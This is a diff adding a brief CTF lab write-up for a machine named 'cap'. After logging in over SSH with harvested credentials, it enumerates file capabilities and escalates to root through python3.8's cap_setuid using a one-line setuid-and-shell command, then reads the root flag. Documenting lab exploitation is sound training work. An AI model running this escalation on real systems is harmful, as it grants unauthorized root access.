@@ -1,0 +1,19 @@
+########################################################    Break intro SSH ########################################################
+
+Login via ssh with credentials collected.
+
+
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:~# 
+
+root@cap:/home# cd /root
+root@cap:/root# ls
+root.txt  snap
+root@cap:/root# 
+root@cap:/root# cat root.txt
